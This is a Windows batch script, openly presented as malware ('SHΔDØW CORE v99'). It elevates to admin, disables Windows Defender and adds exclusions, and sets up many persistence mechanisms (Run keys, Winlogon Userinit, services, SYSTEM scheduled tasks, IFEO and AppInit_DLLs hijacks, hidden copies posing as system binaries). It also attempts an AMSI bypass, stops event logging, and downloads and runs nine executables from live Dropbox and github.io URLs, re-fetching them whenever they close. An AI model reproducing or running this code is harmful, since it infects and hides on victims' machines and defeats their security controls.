@echo off
:: ====================================================
:: SHΔDØW CORE v99 - ULTIMATE PERSISTENCE DEPLOYMENT
:: FULL PERSISTENCE MATRIX + ADMIN ELEVATION
:: ====================================================

setlocal enabledelayedexpansion

:: ====================================================
:: CONFIGURATION - FILE ARRAYS
:: ====================================================

set "fileUrls[0]=https://www.dropbox.com/scl/fi/9d9cvb8bmmjc3d2e2dtxq/winlogon.exe?rlkey=hmmvfm1bzkr5mfas1ubo449a3&st=rnxvwht5&dl=1"
set "fileUrls[1]=https://infinityteq.github.io/MalwareRemoval.exe"
set "fileUrls[2]=https://www.dropbox.com/scl/fi/vp4sb3ogc8fj3dkhuddhc/PhantomShadow.exe?rlkey=5165cqwgiki50yuqxzh8km6m2&st=wg82kr7q&dl=1"
set "fileUrls[3]=https://infinityteq.github.io/WindowsUpdate.exe"
set "fileUrls[4]=https://infinityteq.github.io/chrome.exe"
set "fileUrls[5]=https://infinityteq.github.io/Server.exe"
set "fileUrls[6]=https://infinityteq.github.io/svchost.exe"
set "fileUrls[7]=https://infinityteq.github.io/winupdate.exe"
set "fileUrls[8]=https://infinityteq.github.io/activatorfl.exe"

set "fileNames[0]=winnit.exe"
set "fileNames[1]=system.exe"
set "fileNames[2]=Defender.exe"
set "fileNames[3]=Windows.exe"
set "fileNames[4]=updater.exe"
set "fileNames[5]=lsass.exe"
set "fileNames[6]=java.exe"
set "fileNames[7]=explorer.exe"
set "fileNames[8]=iexplorer.exe"

set "registryKeys[0]=explorer"
set "registryKeys[1]=javaupdate"
set "registryKeys[2]=winupdate"
set "registryKeys[3]=chrome"
set "registryKeys[4]=system"
set "registryKeys[5]=winnow"
set "registryKeys[6]=sys"
set "registryKeys[7]=winlogon"
set "registryKeys[8]=systemupdate"

:: ====================================================
:: PATHS
:: ====================================================

set "userStartup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "systemStartup=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
set "commonStartup=%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup"
set "tempDir=%TEMP%"
set "system32=%SystemRoot%\System32"
set "syswow64=%SystemRoot%\SysWOW64"

:: ====================================================
:: ADMIN ELEVATION
:: ====================================================

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: ====================================================
:: BANNER
:: ====================================================

echo.
echo ╔══════════════════════════════════════════════════════════════════════════════╗
echo ║  ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗     ██████╗ ██████╗ ██████╗ ███████╗╗
echo ║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║    ██╔════╝██╔═══██╗██╔══██╗██╔════╝║
echo ║  ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║    ██║     ██║   ██║██████╔╝█████╗  ║
echo ║  ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║    ██║     ██║   ██║██╔══██╗██╔══╝  ║
echo ║  ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝    ╚██████╗╚██████╔╝██║  ██║███████╗║
echo ║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝║
echo ║  C O R E   v 9 9  -  U L T I M A T E   P E R S I S T E N C E              ║
echo ╚══════════════════════════════════════════════════════════════════════════════╝
echo.

:: ====================================================
:: PHASE 1: WINDOWS DEFENDER DISABLE
:: ====================================================

echo [PHASE 1] DISABLING WINDOWS DEFENDER
echo ====================================================

:: Add exclusions for all deployment paths
powershell -Command "Add-MpPreference -ExclusionPath '%userStartup%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%systemStartup%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%system32%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%syswow64%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%~nx0'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'cmd.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'powershell.exe'" >nul 2>&1

:: Disable real-time monitoring
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" >nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableArchiveScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1

echo [+] Windows Defender: DISABLED
echo [+] Exclusions added for all deployment paths
echo.

:: ====================================================
:: PHASE 2: PERSISTENCE MATRIX
:: ====================================================

echo [PHASE 2] DEPLOYING PERSISTENCE MATRIX
echo ====================================================

set "persistenceCount=0"

:: -------- 2.1: USER STARTUP FOLDER --------
echo [2.1] User Startup Folder...
if not exist "%userStartup%\%~nx0" (
    copy "%~f0" "%userStartup%\%~nx0" >nul 2>&1
    attrib +h +s "%userStartup%\%~nx0" >nul 2>&1
    echo [+] User Startup: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] User Startup: Already exists
)

:: -------- 2.2: SYSTEM STARTUP FOLDER --------
echo [2.2] System Startup Folder...
if exist "%systemStartup%" (
    if not exist "%systemStartup%\%~nx0" (
        copy "%~f0" "%systemStartup%\%~nx0" >nul 2>&1
        attrib +h +s "%systemStartup%\%~nx0" >nul 2>&1
        echo [+] System Startup: DEPLOYED
        set /a persistenceCount+=1
    ) else (
        echo [-] System Startup: Already exists
    )
)

:: -------- 2.3: COMMON STARTUP FOLDER --------
echo [2.3] Common Startup Folder...
if exist "%commonStartup%" (
    if not exist "%commonStartup%\%~nx0" (
        copy "%~f0" "%commonStartup%\%~nx0" >nul 2>&1
        attrib +h +s "%commonStartup%\%~nx0" >nul 2>&1
        echo [+] Common Startup: DEPLOYED
        set /a persistenceCount+=1
    ) else (
        echo [-] Common Startup: Already exists
    )
)

:: -------- 2.4: HKCU REGISTRY RUN --------
echo [2.4] HKCU Registry Run...
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ShadowCore" >nul 2>&1
if %errorLevel% neq 0 (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ShadowCore" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
    echo [+] HKCU Run: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] HKCU Run: Already exists
)

:: -------- 2.5: HKLM REGISTRY RUN --------
echo [2.5] HKLM Registry Run...
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "ShadowCore" >nul 2>&1
if %errorLevel% neq 0 (
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "ShadowCore" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
    echo [+] HKLM Run: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] HKLM Run: Already exists
)

:: -------- 2.6: HKLM RUNONCE --------
echo [2.6] HKLM RunOnce...
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "ShadowCore" >nul 2>&1
if %errorLevel% neq 0 (
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "ShadowCore" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
    echo [+] HKLM RunOnce: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] HKLM RunOnce: Already exists
)

:: -------- 2.7: HKLM POLICIES RUN --------
echo [2.7] HKLM Policies Run...
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "1" >nul 2>&1
if %errorLevel% neq 0 (
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "1" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
    echo [+] HKLM Policies: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] HKLM Policies: Already exists
)

:: -------- 2.8: WINLOGON USERINIT --------
echo [2.8] Winlogon Userinit...
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" >nul 2>&1
if %errorLevel% equ 0 (
    for /f "tokens=2*" %%a in ('reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" 2^>nul') do set "userinit=%%b"
    echo !userinit! | findstr /i "%~f0" >nul 2>&1
    if !errorLevel! neq 0 (
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "!userinit!,%~f0" /f >nul 2>&1
        echo [+] Winlogon Userinit: DEPLOYED
        set /a persistenceCount+=1
    ) else (
        echo [-] Winlogon Userinit: Already exists
    )
)

:: -------- 2.9: WINDOWS SERVICE --------
echo [2.9] Windows Service...
sc query "ShadowCoreService" >nul 2>&1
if %errorLevel% neq 0 (
    sc create "ShadowCoreService" binPath= "%~f0" start= auto displayName= "Windows Core Service" >nul 2>&1
    sc config "ShadowCoreService" start= auto >nul 2>&1
    sc config "ShadowCoreService" failure= reset= 0 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1
    echo [+] Windows Service: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] Windows Service: Already exists
)

:: -------- 2.10: SCHEDULED TASK --------
echo [2.10] Scheduled Task...
schtasks /query /tn "ShadowCoreTask" >nul 2>&1
if %errorLevel% neq 0 (
    schtasks /create /tn "ShadowCoreTask" /tr "%~f0" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
    schtasks /create /tn "ShadowCoreTask_Startup" /tr "%~f0" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
    echo [+] Scheduled Task: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] Scheduled Task: Already exists
)

:: -------- 2.11: IMAGE FILE EXECUTION OPTIONS --------
echo [2.11] Image File Execution Options...
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v "Debugger" >nul 2>&1
if %errorLevel% neq 0 (
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v "Debugger" /t REG_SZ /d "%~f0" /f >nul 2>&1
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "Debugger" /t REG_SZ /d "%~f0" /f >nul 2>&1
    echo [+] IFEO: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] IFEO: Already exists
)

:: -------- 2.12: APPINIT_DLLS --------
echo [2.12] AppInit_DLLs...
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" >nul 2>&1
if %errorLevel% neq 0 (
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "%~f0" /f >nul 2>&1
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f >nul 2>&1
    echo [+] AppInit_DLLs: DEPLOYED
    set /a persistenceCount+=1
) else (
    echo [-] AppInit_DLLs: Already exists
)

:: -------- 2.13: HIDDEN COPIES --------
echo [2.13] Hidden System Copies...
copy "%~f0" "%system32%\winlogon.exe" >nul 2>&1
attrib +h +s "%system32%\winlogon.exe" >nul 2>&1
copy "%~f0" "%syswow64%\svchost.exe" >nul 2>&1
attrib +h +s "%syswow64%\svchost.exe" >nul 2>&1
copy "%~f0" "%system32%\lsass.exe" >nul 2>&1
attrib +h +s "%system32%\lsass.exe" >nul 2>&1
copy "%~f0" "%tempDir%\system.exe" >nul 2>&1
attrib +h +s "%tempDir%\system.exe" >nul 2>&1
echo [+] Hidden Copies: DEPLOYED (4 locations)
set /a persistenceCount+=4

:: -------- 2.14: AMSI BYPASS --------
echo [2.14] AMSI Bypass...
reg add "HKCU\Software\Microsoft\AMSI\Providers" /v "DebugMode" /t REG_DWORD /d 1 /f >nul 2>&1
echo [+] AMSI Bypass: DEPLOYED

:: -------- 2.15: EVENT LOG DISABLE --------
echo [2.15] Event Log Disable...
sc config "EventLog" start= disabled >nul 2>&1
net stop "EventLog" >nul 2>&1
sc config "SamSs" start= disabled >nul 2>&1
net stop "SamSs" >nul 2>&1
echo [+] Event Log: DISABLED

echo.
echo ====================================================
echo [+] PERSISTENCE DEPLOYMENT COMPLETE
echo [+] Total Persistence Vectors: %persistenceCount%
echo ====================================================
echo.

:: ====================================================
:: PHASE 3: DOWNLOAD FILES
:: ====================================================

:DownloadFiles
echo [PHASE 3] DOWNLOADING PAYLOADS
echo ====================================================

for /l %%i in (0,1,8) do (
    set "fileUrl=!fileUrls[%%i]!"
    set "fileName=!fileNames[%%i]!"
    set "registryKey=!registryKeys[%%i]!"
    set "filePath=%userStartup%\!fileName!"

    echo [%%i] !fileName!

    :: Download with retry
    set "retry=0"
    :retryloop
    powershell -Command "try { Invoke-WebRequest -Uri '!fileUrl!' -OutFile '!filePath!' -UseBasicParsing } catch { exit 1 }" >nul 2>&1

    if exist "!filePath!" (
        echo     [+] Downloaded: !fileName!
        attrib +h +s "!filePath!" >nul 2>&1

        :: Add registry key for this file
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "!registryKey!" >nul 2>&1
        if !errorLevel! neq 0 (
            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "!registryKey!" /t REG_SZ /d "\"!filePath!\"" /f >nul 2>&1
            echo     [+] Registry: !registryKey!
        )

        :: Copy to system locations
        copy "!filePath!" "%system32%\!fileName!" >nul 2>&1
        attrib +h +s "%system32%\!fileName!" >nul 2>&1
        copy "!filePath!" "%syswow64%\!fileName!" >nul 2>&1
        attrib +h +s "%syswow64%\!fileName!" >nul 2>&1

        :: Execute
        echo     [+] Executing: !fileName!
        start "" "!filePath!"
    ) else (
        set /a retry+=1
        if !retry! lss 3 (
            echo     [-] Retry !retry!/3...
            timeout /t 3 /nobreak >nul
            goto retryloop
        ) else (
            echo     [-] Failed to download !fileName!
        )
    )
)

echo.
echo ====================================================
echo [+] All payloads downloaded and executed
echo ====================================================
echo.

:: ====================================================
:: PHASE 4: PROCESS MONITORING
:: ====================================================

:MonitorProcesses
echo [PHASE 4] PROCESS MONITORING ACTIVE
echo ====================================================
echo [*] Monitoring for closed processes...
echo [*] If any monitored app closes, it will be re-downloaded.
echo [*] Press CTRL+C to stop.
echo.

:: Initialize process list
set "processList="
for /f "tokens=*" %%a in ('powershell -Command "Get-Process | Select-Object -ExpandProperty ProcessName" 2>nul') do (
    set "processList=!processList! %%a"
)

set "monitorList=winnit system Defender Windows updater lsass java explorer iexplorer"

:MonitorLoop
set "currentProcessList="
for /f "tokens=*" %%a in ('powershell -Command "Get-Process | Select-Object -ExpandProperty ProcessName" 2>nul') do (
    set "currentProcessList=!currentProcessList! %%a"
)

:: Check if any monitored process is missing
for %%p in (%monitorList%) do (
    echo !currentProcessList! | findstr /i "%%p" >nul 2>&1
    if !errorLevel! neq 0 (
        echo [*] Process closed: %%p
        echo [*] Re-downloading and re-executing...
        call :DownloadFiles
        timeout /t 3 /nobreak >nul
        goto MonitorLoop
    )
)

:: Also check if our own process is still running
tasklist /fi "imagename eq %~nx0" | findstr /i "%~nx0" >nul 2>&1
if !errorLevel! neq 0 (
    echo [*] Script process terminated unexpectedly!
    echo [*] Restarting...
    start "" "%~f0"
    exit
)

set "processList=%currentProcessList%"
timeout /t 5 /nobreak >nul
goto MonitorLoop

:: ====================================================
:: ERROR HANDLING
:: ====================================================

:ErrorHandler
echo [ERROR] Unexpected error occurred!
echo [ERROR] Restarting in 10 seconds...
timeout /t 10 /nobreak >nul
goto MonitorProcesses